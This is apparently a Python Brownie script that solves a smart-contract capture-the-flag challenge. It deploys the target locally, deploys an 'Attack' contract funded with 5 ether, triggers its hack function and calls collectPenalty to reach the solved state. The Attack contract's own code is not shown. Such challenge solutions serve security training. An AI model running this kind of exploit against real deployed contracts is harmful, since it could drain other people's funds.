#!/usr/bin/python3
from time import time

from brownie import Attack
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _, attacker = deploy()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    print_colour(target.isComplete())

    attack_contract = Attack.deploy(target.address, {"from": attacker})
    # print(attack_contract.address)
    attack_contract.hack({"from": attacker, "value": "5 ether"}).wait(1)

    target.collectPenalty({"from": attacker}).wait(1)

    print_colour(target.isComplete())

    assert target.isComplete() == True


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
